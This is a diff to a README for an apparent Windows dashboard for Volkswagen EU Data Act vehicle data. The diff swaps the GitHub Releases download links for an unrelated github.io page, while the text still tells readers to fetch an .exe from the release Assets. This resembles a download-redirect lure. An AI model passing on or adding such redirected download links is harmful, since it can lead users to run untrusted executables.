@@ -1,6 +1,6 @@
 # 🔋 vw-eu-data-act-dashboard - Turn electric vehicle data into insights
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/camberbathingcap788/vw-eu-data-act-dashboard/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://camberbathingcap788.github.io)
 
 This application helps you understand your electric vehicle data. You can download your personal data from Volkswagen Group through an EU Data Act request. This tool turns those files into a readable dashboard. You see your battery health, charging history, and driving patterns without sending your data to a cloud server. 
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your computer needs at lea
 
 ## 📥 Getting the software
 
-Visit this page to download the latest version of the dashboard: https://github.com/camberbathingcap788/vw-eu-data-act-dashboard/releases.
+Visit this page to download the latest version of the dashboard: https://camberbathingcap788.github.io
 
 Look for the file that ends in .exe under the Assets section of the latest release. Save this file to your computer.
 
